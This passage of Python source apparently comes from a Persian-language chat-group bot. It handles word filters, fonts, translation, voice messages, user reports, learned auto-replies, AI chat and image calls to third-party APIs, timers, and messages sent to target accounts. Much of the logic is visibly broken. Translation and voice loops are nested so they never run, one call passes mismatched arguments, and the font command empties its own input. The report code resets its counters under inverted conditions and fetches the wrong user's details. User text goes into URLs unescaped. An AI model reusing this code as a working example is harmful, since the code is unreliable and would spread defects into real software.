                            isok = int(ORDERS_KEYS[Listkeys['حذف فیلتر']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                reply_message_text = steps['text']
                                if reply_message_text in INFOS[object_guid]['filterlist']:
                                    INFOS[object_guid]['filterlist'].remove(reply_message_text)
                                    mess = MPro('کلمه ' + reply_message_text + ' از لیست فیلتر حذف شد. ' + ST['ok'], 2)
                                else:
                                    mess = MPro('کلمه ' + reply_message_text + ' در لیست فیلتر یافت نشد. ' + ST['ok'], 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'حذف کلید':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['حذف کلید']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                reply_message_text = steps['text']
                                if reply_message_text in INFOS[object_guid]['main_keys']:
                                    INFOS[object_guid]['main_keys'].remove(reply_message_text)
                                    mess = MPro('کلمه ' + reply_message_text + ' از لیست کلید حذف شد. ' + ST['ok'], 2)
                                else:
                                    mess = MPro('کلمه ' + reply_message_text + ' در لیست کلید یافت نشد. ' + ST['ok'], 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'فیلتر':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['فیلتر']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                reply_message_text = steps['text']
                                if reply_message_text in INFOS[object_guid]['filterlist']:
                                    mess = MPro('کلمه ' + reply_message_text + ' در لیست فیلتر بود. ' + ST['ok'], 2)
                                else:
                                    INFOS[object_guid]['filterlist'].append(reply_message_text)
                                    mess = MPro('کلمه ' + reply_message_text + ' فیلتر شد. ' + ST['ok'], 2)
                            ResultME = send_message_limited(OBJM, mess, message_id)
                    elif command == 'فونت':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['فونت']])
                        if isok:
                            text = command.replace('فونت', '').strip()
                            if not is_english_text(text):
                                text = Translater(text, to_lang='en')
                            if len(text) > 0:
                                rand = False
                                if len(text) > 10:
                                    rand = True
                                result = Fontmaker(text)
                                mess = MPro('〔 فونت 〕', 4)
                                if rand:
                                    num = int(random.randint(0, int(len(result)) - 1))
                                mess += MPro(result[num])
                                for font in result:
                                    mess += MPro(font)
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'افکت':
                        ResultME = send_message(OBJM, MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2), message_id=message_id)
                    elif command == 'ترجمه':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس']])
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                sended = True
                                text = steps['text']
                                steps = command.replace('ویس', '').strip()
                                target = False
                                if len(steps) > 0:
                                    steps = steps.split(' ')
                                    len_steps = len(steps)
                                    target = steps[len_steps - 1]
                                else:
                                    name_target = False
                                for box_lang in Box_langs:
                                    if name_target:
                                        break
                                    for bx in box_lang:
                                        if bx == target:
                                            target = box_lang[2]
                                            name_target = box_lang[0]
                                            break
                                        else:
                                            continue
                                if not target:
                                    target = Detect_lang(text)
                                else:
                                    if not name_target:
                                        for box_lang in Box_langs:
                                            if name_target:
                                                for bx in box_lang:
                                                    if target == bx:
                                                        name_target = box_lang[0]
                                                        break
                                                    else:
                                                        continue
                                    local = Detect_lang(text)
                                    name_local = False
                                    for box_lang in Box_langs:
                                        if name_local:
                                            for bx in box_lang:
                                                if local == bx:
                                                    name_local = box_lang[0]
                                                else:
                                                    continue
                                        else:
                                            if not name_local:
                                                name_local = 'نامشخص'
                                            if name_target:
                                                try:
                                                    result = Translater(text, to_lang=target, from_lang=local)
                                                    text = MPro('زبان اصلی: ' + name_local, 2)
                                                    text += MPro(result, 2)
                                                    send_message(OBJM, object_guid, text, message_id=message_id)
                                                    sended = True
                                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                                except:
                                                    pass
                                                try:
                                                    os.remove(name_file)
                                                except:
                                                    pass
                                            else:
                                                mess = MPro('زبان مورد نظر یافت نشد. ' + ST['ok'], 2)
                            if not sended:
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                            if not ResultME and is_reply_message:
                                if TIP <= 3 or int(SETTING_KEYS[14]):
                                    isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                                    if isok:
                                        ResultME = send_message(OBJM, isok, message_id=message_id)
                                    elif isok is False:
                                        ResultME = True
                    elif command == 'ویس':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس']])
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                sended = True
                                text = steps['text']
                                steps = command.replace('ویس', '').strip()
                                target = False
                                if len(steps) > 0:
                                    steps = steps.split(' ')
                                    len_steps = len(steps)
                                    target = steps[len_steps - 1]
                                else:
                                    name_target = False
                                for box_lang in Box_langs:
                                    if name_target:
                                        break
                                    for bx in box_lang:
                                        if bx == target:
                                            target = box_lang[2]
                                            name_target = box_lang[0]
                                            break
                                        else:
                                            continue
                                if not target:
                                    target = Detect_lang(text)
                                else:
                                    if not name_target:
                                        for box_lang in Box_langs:
                                            if name_target:
                                                for bx in box_lang:
                                                    if target == bx:
                                                        name_target = box_lang[0]
                                                        break
                                                    else:
                                                        continue
                                    local = Detect_lang(text)
                                    name_local = False
                                    for box_lang in Box_langs:
                                        if name_local:
                                            for bx in box_lang:
                                                if local == bx:
                                                    name_local = box_lang[0]
                                                else:
                                                    continue
                                        else:
                                            if not name_local:
                                                name_local = 'نامشخص'
                                            if name_target:
                                                try:
                                                    result = Translater(text, to_lang=target, from_lang=local)
                                                    text = MPro('زبان اصلی: ' + name_local, 2)
                                                    text += MPro(result, 2)
                                                    audio = Voice_google(result, target)
                                                    name_file = f'transVoice_{str(get_iran_timestamp())}.mp3'
                                                    audio.save(name_file)
                                                    ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                                    sended = True
                                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                                except:
                                                    pass
                                                try:
                                                    os.remove(name_file)
                                                except:
                                                    pass
                                            else:
                                                mess = MPro('زبان مورد نظر یافت نشد. ' + ST['ok'], 2)
                            if not sended:
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                            if not ResultME and is_reply_message:
                                if TIP <= 3 or int(SETTING_KEYS[14]):
                                    isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                                    if isok:
                                        ResultME = send_message(OBJM, isok, message_id=message_id)
                                    elif isok is False:
                                        ResultME = True
                    elif command.startswith('گزارش'):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['گزارش']])
                        if isok:
                            mess = MPro('کاربر شناسایی نشد. ' + ST['ok'], 2)
                            reply_message = GetInfoByMessageId(object_guid, is_reply_message)
                            if reply_message:
                                if object_guid not in reaporter_limit:
                                    reaporter_limit[object_guid] = {}
                                if guid_sender not in reaporter_limit[object_guid]:
                                    reaporter_limit[object_guid][guid_sender] = 0
                                if reaporter_limit[object_guid][guid_sender] >= 2:
                                    mess = MPro('بیش از حد مجاز ' + ST['ok'], 2)
                                else:
                                    reaporter_limit[object_guid][guid_sender] += 1
                                    reply_message_guid = GetReplyGuid(reply_message)
                                    reaporter_message = command.replace('گزارش', '', 1).strip()
                                    reaport_message = ''
                                    if 'text' in reply_message:
                                        reaport_message = reply_message['text']
                                    reaport_sender_info = client.get_chat_info(guid_sender)['user']
                                    reaport_user_info = client.get_chat_info(guid_sender)['user']
                                    time.sleep(0.25)
                                    reaport_text = MPro('گزارش ارسالی ‼️', 4)
                                    reaport_text += MPro('مشخصات گزارش کننده - 👨🏻\u200d💻')
                                    reaport_text += manage_info(reaport_sender_info)
                                    reaport_text += MPro('گوید : ' + str(guid_sender))
                                    reaport_text += MPro('توضیحات : ' + str(reaporter_message))
                                    reaport_text += '\n'
                                    reaport_text += MPro('مشخصات فرد گزارش شده - 🔻')
                                    reaport_text += manage_info(reaport_user_info)
                                    reaport_text += MPro('گوید : ' + reply_message_guid)
                                    reaport_text += MPro('پیام گزارش شده  : ' + reaport_message)
                                    client.send_text(HOWNER, reaport_text)
                                    time.sleep(0.25)
                                    mess = MPro('گزارش ارسال شد. ', 2)
                                    ResultME = send_message_limited(OBJM, mess, message_id)
            if not ResultME and is_reply_message:
                if TIP <= 3:
                    if int(SETTING_KEYS[14]):
                        isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                        if isok:
                            ResultME = send_message(OBJM, isok, message_id)
                        elif isok is False:
                            ResultME = True
                if not ResultME:
                    if command.startswith('گزارش'):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['گزارش']])
                        if isok:
                            mess = MPro(f"کاربر شناسایی نشد. {ST['ok']}", 2)
                            reply_message = GetInfoByMessageId(object_guid, is_reply_message)
                            if reply_message:
                                if object_guid in reaporter_limit:
                                    reaporter_limit[object_guid] = {}
                                if guid_sender in reaporter_limit[object_guid]:
                                    reaporter_limit[object_guid][guid_sender] = 0
                                if reaporter_limit[object_guid][guid_sender] >= 2:
                                    mess = MPro(f"بیش از حد مجاز {ST['ok']}", 2)
                                else:
                                    reaporter_limit[object_guid][guid_sender] += 1
                                    reply_message_guid = GetReplyGuid(reply_message)
                                    reaporter_message = command.replace('گزارش', '', 1).strip()
                                    reaport_message = ''
                                    if 'text' in reply_message:
                                        reaport_message = reply_message['text']
                                    reaport_sender_info = client.get_chat_info(guid_sender)['user']
                                    time.sleep(0.25)
                                    reaport_user_info = client.get_chat_info(reply_message_guid)['user']
                                    reaport_text = MPro('گزارش ارسالی ‼️', 4)
                                    reaport_text += MPro('مشخصات گزارش کننده - 👨🏻\u200d💻')
                                    reaport_text += manage_info(reaport_sender_info)
                                    reaport_text += MPro(f'گوید : {guid_sender}')
                                    reaport_text += MPro(f'توضیحات : {reaporter_message}')
                                    reaport_text += '\n'
                                    reaport_text += MPro('مشخصات فرد گزارش شده - 🔻')
                                    reaport_text += manage_info(reaport_user_info)
                                    reaport_text += MPro(f'گوید : {reply_message_guid}')
                                    reaport_text += MPro(f'پیام گزارش شده  : {reaport_message}')
                                    client.send_text(HOWNER, reaport_text)
                                    time.sleep(0.25)
                                    mess = MPro(f"گزارش ارسال شد. {ST['ok']}", 2)
                            ResultME = send_message_limited(OBJM, mess, message_id)
            if TIP >= 2 and (not ResultME) and ((is_reply_message and is_reply_message in ARMessages[object_guid]) or not is_reply_message):
                if TIP <= 3 and int(SETTING_KEYS[14]):
                    isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                    if isok:
                        ResultME = send_message(OBJM, isok, message_id)
                    if isok is False:
                        ResultME = True
                if not ResultME:
                    if command.find(' !!') >= 0:
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['سخنگو']])
                        if isok:
                            ans = []
                            key = False
                            sended = False
                            result = Get_tip_from_str(command)
                            command = result['command']
                            TIP_ANS = result['TIP']
                            steps = command.split(' !!')
                            for step in steps:
                                step = step.strip()
                                if len(step) > 0:
                                    if not key:
                                        key = step
                                    else:
                                        ans.append(step)
                            if TIP_ANS not in SPEAKX:
                                SPEAKX[TIP_ANS] = {}
                            SPEAK = SPEAKX[TIP_ANS]
                            if len(ans) <= 0:
                                if key in SPEAK:
                                    cnt = str(len(SPEAK[key]))
                                    del SPEAKX[TIP_ANS][key]
                                    mess = MPro(f'{cnt} کلمه و کلیدواژه 〔 {key} 〕 حذف شد.' + ST['ok'])
                                    sended = True
                            elif key in SPEAK:
                                cnt = 0
                                for de in ans:
                                    for step in SPEAK[key]:
                                        if 'answer' in step:
                                            if step['answer'] == de:
                                                SPEAKX[TIP_ANS][key].remove(step)
                                                cnt += 1
                                if cnt != 0:
                                    mess = MPro(f'{cnt} کلمه از کلیدواژه  〔 {key} 〕 حذف شد.' + ST['ok'])
                                    sended = True
                            if sended:
                                ResultME = send_message_limited(OBJM, mess, message_id)
                    elif command.startswith('! '):
                        isok = 1
                        UPFILES(file_speakx, SPEAKX)
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['سخنگو']])
                        if isok:
                            mess = MPro('〔 جملات مورد نظر 〕', 1)
                            empty = True
                            search = command.replace('!', '').strip()
                            for TIP_ANS in SPEAKX:
                                SPEAK = SPEAKX[TIP_ANS]
                                rank = Rank_user(TIP_ANS, OBJM)
                                for word in SPEAK:
                                    if search in word:
                                        empty = False
                                        mess += '\n'
                                        if TIP_ANS.startswith('u0'):
                                            mess += MPro(f'{word} - @@{rank}@@({TIP_ANS})', 2)
                                        else:
                                            mess += MPro(f'{word} - {rank}', 2)
                                        mess += '\n'
                                        for step in SPEAK[word]:
                                            if 'answer' in step:
                                                mess += MPro(step['answer'], 3)
                                            if 'actions' in step:
                                                form_actions = ''
                                                first_cmd = True
                                                for action in step['actions']:
                                                    if first_cmd:
                                                        first_cmd = False
                                                        form_actions += action
                                                    else:
                                                        form_actions += f' > {action}'
                                                if len(form_actions) > 0:
                                                    mess += MPro(form_actions, 4)
                                        mess += '\n'
                            if empty:
                                mess = MPro(f"لغتی پیدا نشد.{ST['ok']}", 2)
                            ResultME = send_message_limited(OBJM, mess, message_id, False)
                    elif command.find(' !') >= 0:
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['سخنگو']])
                        if isok:
                            result = Get_tip_from_str(command)
                            command = result['command']
                            TIP_ANS = result['TIP']
                            result = Get_actions_from_str(command)
                            command = result['command']
                            actions = result['actions']
                            steps = command.split('!')
                            iskey, isadded = (False, False)
                            if TIP_ANS not in SPEAKX:
                                SPEAKX[TIP_ANS] = {}
                            SPEAK = SPEAKX[TIP_ANS]
                            for step in steps:
                                if len(step) <= 0:
                                    continue
                                if not iskey:
                                    iskey = True
                                    key = step
                                    key = key.replace('آ', 'ا').strip()
                                else:
                                    step = step.replace('آ', 'ا').strip()
                                    if key not in SPEAK:
                                        SPEAKX[TIP_ANS][key] = []
                                    child = {}
                                    if len(step) > 0:
                                        child['answer'] = step
                                    if len(actions) > 0:
                                        child['actions'] = actions
                                    SPEAKX[TIP_ANS][key].append(child)
                                    isadded = True
                            if not isadded and len(actions) > 0 and iskey:
                                if key not in SPEAK:
                                    SPEAKX[TIP_ANS][key] = []
                                child = {}
                                child['actions'] = actions
                                SPEAKX[TIP_ANS][key].append(child)
                                isadded = True
                            if isadded:
                                UPFILES(file_speakx, SPEAKX)
                                mess = MPro('یاد گرفتم. ' + ST['ok'], 2)
                                ResultME = send_message_limited(OBJM, mess, message_id)
                                arange_list_words()
                    elif command.startswith('//'):
                        if len(command) > 1:
                            isok = 1
                            if TIP <= 3:
                                isok = int(ORDERS_KEYS[Listkeys['//']])
                            if isok:
                                QUS = command.replace('//', '').strip()
                                if len(QUS) > 0:
                                    mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                    try:
                                        mess = requests.get(f'https://api-free.ir/api/chat2.php?text={QUS}', timeout=30).json()['result']
                                    except:
                                        pass
                                    ResultME = send_message_limited(OBJM, f'**{mess}**', message_id)
                    elif command.startswith('/'):
                        if len(command) > 1:
                            isok = 1
                            if TIP <= 3:
                                isok = int(ORDERS_KEYS[Listkeys['/']])
                            if isok:
                                QUS = command.replace('/', '').strip()
                                if len(QUS) > 0:
                                    mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                    try:
                                        mess = requests.get(f'https://api-free.ir/api/chat.php?text={QUS}', timeout=30).json()['result']
                                    except:
                                        pass
                                    ResultME = send_message_limited(OBJM, f'**{mess}**', message_id)
                    elif command.startswith('ثبت یادداشت'):
                        command = command.replace('ثبت یادداشت', '').strip()
                        if len(command) > 0:
                            INFOS[object_guid]['remmember'].append({'text': command, 'date': get_iran_timestamp()})
                            mess = MPro(f"به لیست یادداشت اضافه شد. {ST['ok']}", 2)
                            ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('ویس زن '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس زن']])
                        if isok:
                            QUS = command.replace('ویس زن', '').strip()
                            if len(QUS) > 0:
                                mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                sended = False
                                baner = INFOS[object_guid]['baner']
                                ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                name_file = f'voice_{str(get_iran_timestamp())}.mp3'
                                voice_AI(QUS, 'DilaraNeural', name_file)
                                text = MPro(f'متن شما : {QUS}', 4)
                                try:
                                    ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                    sended = True
                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                except:
                                    pass
                                os.remove(name_file)
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('ویس مرد '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس مرد']])
                        if isok:
                            QUS = command.replace('ویس مرد', '').strip()
                            if len(QUS) > 0:
                                mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                sended = False
                                baner = INFOS[object_guid]['baner']
                                ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                name_file = f'voice_{str(get_iran_timestamp())}.mp3'
                                voice_AI(QUS, 'FaridNeural', name_file)
                                text = MPro(f'متن شما : {QUS}', 4)
                                try:
                                    ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                    sended = True
                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                except:
                                    pass
                                os.remove(name_file)
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('ویس '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس']])
                        if isok:
                            mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                            text = command.replace('ویس', '').strip()
                            local = Detect_lang(text)
                            name_target = False
                            for box_lang in Box_langs:
                                if name_target:
                                    break
                                for bx in box_lang:
                                    if local == bx:
                                        name_target = box_lang[0]
                                        break
                            if not name_target:
                                name_target = 'نامشخص'
                            audio = Voice_google(text, lang=local)
                            name_file = f'voice_{str(get_iran_timestamp())}.mp3'
                            audio.save(name_file)
                            text = MPro(f'متن شما : {text} ({name_target})', 4)
                            try:
                                ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                sended = True
                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                            except:
                                pass
                            os.remove(name_file)
                            if not sended:
                                ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('لوگو2 '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['لوگو2']])
                        if isok:
                            QUS = command.replace('لوگو2', '').strip()
                            if len(QUS) > 0:
                                if object_guid not in limitAPI:
                                    limitAPI[object_guid] = 0
                                limitAPI[object_guid] += 1
                                if limitAPI[object_guid] < 6:
                                    mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                    sended = False
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                    if not is_english_text(QUS):
                                        QUS = Translater(QUS, to_lang='en')
                                    urls = requests.get(f'https://api-free.ir/api/Logo-top.php?page=90&text={QUS}', timeout=30).json()['result']
                                    rand = random.randint(0, len(urls) - 1)
                                    url = urls[rand].replace(';', '&')
                                    response = requests.get(url, timeout=30)
                                    name_file = f'logo2_{str(get_iran_timestamp())}.png'
                                    with open(name_file, 'wb') as file:
                                        file.write(response.content)
                                    text = MPro(f'متن شما : {QUS}', 4)
                                    try:
                                        ResultME = client.send_image(object_guid, name_file, message_id, text)
                                        sended = True
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                    except:
                                        pass
                                    os.remove(name_file)
                                    if not sended:
                                        ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('لوگو3 '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['لوگو3']])
                        if isok:
                            QUS = command.replace('لوگو3', '').strip()
                            if len(QUS) > 0:
                                if object_guid not in limitAPI:
                                    limitAPI[object_guid] = 0
                                limitAPI[object_guid] += 1
                                if limitAPI[object_guid] < 6:
                                    mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                    sended = False
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                    rand = str(random.randint(1, 100))
                                    if not is_english_text(QUS):
                                        QUS = Translater(QUS, to_lang='en')
                                    urls = requests.get(f'https://api-free.ir/api/Logo.php?style={rand}&text={QUS}', timeout=30).json()['result']
                                    rand = random.randint(0, len(urls) - 1)
                                    response = requests.get(urls[rand], timeout=30)
                                    name_file = f'logo3_{str(get_iran_timestamp())}.png'
                                    with open(name_file, 'wb') as file:
                                        file.write(response.content)
                                    text = MPro(f'متن شما : {QUS}', 4)
                                    try:
                                        ResultME = client.send_image(object_guid, name_file, message_id, text)
                                        sended = True
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                    except:
                                        pass
                                    os.remove(name_file)
                                    if not sended:
                                        ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('لوگو '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['لوگو']])
                        if isok:
                            QUS = command.replace('لوگو', '').strip()
                            if len(QUS) > 0:
                                mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                sended = False
                                baner = INFOS[object_guid]['baner']
                                ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                rand = str(random.randint(1, 100))
                                if not is_english_text(QUS):
                                    QUS = Translater(QUS, to_lang='en')
                                result = requests.get(f'http://api2.haji-api.ir/ephoto360?type=text&id={rand}&text={QUS}', timeout=30)
                                name_file = f'logo_{str(get_iran_timestamp())}.png'
                                with open(name_file, 'wb') as file:
                                    file.write(result.content)
                                text = MPro(f'متن شما : {QUS}', 4)
                                try:
                                    ResultME = client.send_image(object_guid, name_file, message_id, text)
                                    sended = True
                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                except:
                                    pass
                                os.remove(name_file)
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('عکس '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['عکس']])
                        if isok:
                            QUS = command.replace('عکس', '').strip()
                            if len(QUS) > 0:
                                if object_guid not in limitAPI:
                                    limitAPI[object_guid] = 0
                                limitAPI[object_guid] += 1
                                if limitAPI[object_guid] < 6:
                                    mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                    sended = False
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                    if not is_english_text(QUS):
                                        QUS = Translater(QUS, to_lang='en')
                                    urls = requests.get(f'https://haji-api.ir/prompts/?text={QUS}', timeout=30).json()['result']
                                    rand = random.randint(0, len(urls) - 1)
                                    response = requests.get(urls[rand], timeout=30)
                                    name_file = f'photoAi_{str(get_iran_timestamp())}.png'
                                    with open(name_file, 'wb') as file:
                                        file.write(response.content)
                                    text = MPro(f'متن شما : {QUS}', 4)
                                    try:
                                        ResultME = client.send_image(object_guid, name_file, message_id, text)
                                        sended = True
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                    except:
                                        pass
                                    os.remove(name_file)
                                    if not sended:
                                        ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('ساخت عکس '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ساخت عکس']])
                        if isok:
                            QUS = command.replace('ساخت عکس', '').strip()
                            if len(QUS) > 0:
                                mess = MPro(f"خطایی در دریافت دیتا رخ داد. {ST['ok']}", 2)
                                sended = False
                                baner = INFOS[object_guid]['baner']
                                ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id)
                                if not is_english_text(QUS):
                                    QUS = Translater(QUS, to_lang='en')
                                data = requests.get(f'https://api-free.ir/api/img.php?text={QUS}&v=3.5', timeout=30).json()
                                response = requests.get(random.choice(data['result']), timeout=30)
                                name_file = f'photoAi_{str(get_iran_timestamp())}.png'
                                with open(name_file, 'wb') as file:
                                    file.write(response.content)
                                text = MPro(f'متن شما : {QUS}', 4)
                                try:
                                    ResultME = client.send_image(object_guid, name_file, message_id, text)
                                    sended = True
                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                except:
                                    pass
                                os.remove(name_file)
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('تایمر '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['تایمر']])
                        if isok:
                            local = command.replace('تایمر ', '', 1).strip()
                            lines = local.split('\n')
                            first = True
                            timer = False
                            type_timer = False
                            commands_auto = []
                            for line in lines:
                                if first:
                                    is_loop = True
                                    if '-' in line:
                                        line = line.split('-')
                                        is_loop = False
                                        loop_mung = line[1].strip()
                                        if loop_mung.isnumeric():
                                            loop_mung = int(loop_mung)
                                        line = line[0].strip()
                                    if ':' in line:
                                        steps = line.split(':')
                                        hour = steps[0]
                                        hour = int(hour.strip())
                                        if hour >= 24:
                                            hour = 23
                                        if hour < 0:
                                            hour = 0
                                        minute = steps[1]
                                        minute = int(minute.strip())
                                        if minute >= 60:
                                            minute = 59
                                        if minute < 0:
                                            minute = 0
                                        type_timer = 'intime'
                                    elif line.isnumeric():
                                        timer = int(line.strip())
                                        if timer < 5:
                                            timer = 5
                                        type_timer = 'pertime'
                                    else:
                                        timer = 0
                                        elms = {'قرن': 3110400000, 'سال': 31104000, 'ماه': 2592000, 'هفته': 604800, 'روز': 86400, 'ساعت': 3600, 'دقیقه': 60, 'ثانیه': 1}
                                        steps = line.split('و ')
                                        for step in steps:
                                            getit = False
                                            for elm in elms:
                                                if getit:
                                                    break
                                                if elm in step:
                                                    mung = step.replace(elm, '').strip()
                                                    if mung.isnumeric():
                                                        timer += int(mung) * elms[elm]
                                                        getit = True
                                            if not getit:
                                                step = step.strip()
                                                if step.isnumeric():
                                                    timer += int(step)
                                        if timer < 5:
                                            timer = 5
                                        type_timer = 'pertime'
                                    first = False
                                else:
                                    if line.endswith('+'):
                                        line = line.replace('+', '-')
                                    line = str(line.strip())
                                    if len(line) > 0:
                                        commands_auto.append(line)
                            if len(commands_auto) > 0 and type_timer:
                                STEP = {}
                                STEP['TYPE'] = type_timer
                                if type_timer == 'pertime':
                                    STEP['PERTIME'] = {'old': get_iran_timestamp(), 'per': int(timer)}
                                elif type_timer == 'intime':
                                    STEP['INTIME'] = {'hour': int(hour), 'minute': int(minute), 'day': int(Day()) - 1}
                                STEP['COMMANDS'] = commands_auto
                                STEP['GUID_SENDER'] = guid_sender
                                STEP['is_loop'] = is_loop
                                if not is_loop:
                                    STEP['loop_mung'] = loop_mung
                                    STEP['loop_mung_use'] = 0
                                INFOS[object_guid]['AUTOS'].append(STEP)
                                ResultME = send_message(OBJM, MPro(f"تایمر تنظیم شد. {ST['ok']}", 2), message_id)
                    elif command.startswith('نجوا '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['نجوا']])
                        if isok:
                            command = command.replace('\\n', '\n')
                            command = command.replace('نجوا', '').strip()
                            target_ids = []
                            target_text = command
                            for step in command.split('\n')[0].split(' '):
                                result = Get_guid(step)[0]
                                if result:
                                    target_ids.append(result)
                                    target_text = command.split(step, 1)[1].strip()
                                elif step.startswith('u0') or step.startswith('g0') or step.startswith('c0'):
                                    target_ids.append(step)
                                    target_text = command.split(step, 1)[1].strip()
                            mess = MPro(f"نمیتونم به این نشونی برم. {ST['ok']}", 1)
                            if len(target_ids) > 0 and len(target_text) > 0:
                                for target_id in target_ids:
                                    try:
                                        target_text = make_dinamic_ans(target_text, target_id, object_guid, None, True, False, None, FILTERLIST, False, True)
                                        if target_text:
                                            client.send_text(target_id, target_text)
                                    except:
                                        pass
                                    time.sleep(0.5)
                                mess = MPro(f"نجوا ارسال شد. {ST['ok']}", 1)
                            ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('پست') and 'تارگت' in command:
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['پست']])
                        if isok:
                            command = command.replace('\\n', '\n')
                            target_finder = False
                            steps = command.split('تارگت')
                            for step in steps:
                                if target_finder:
                                    break
                                if step.strip().startswith('-'):
                                    command = command.replace('تارگت' + step, '', 1).strip()
                                    target_finder = step.strip()
                            if target_finder:
                                command = command.replace('پست', '', 1).strip()
                                target_ids = []
                                target_text = command
                                for line in target_finder.split('\n'):
                                    for step in line.split(' '):
                                        result = Get_guid(step)[0]
                                        if result:
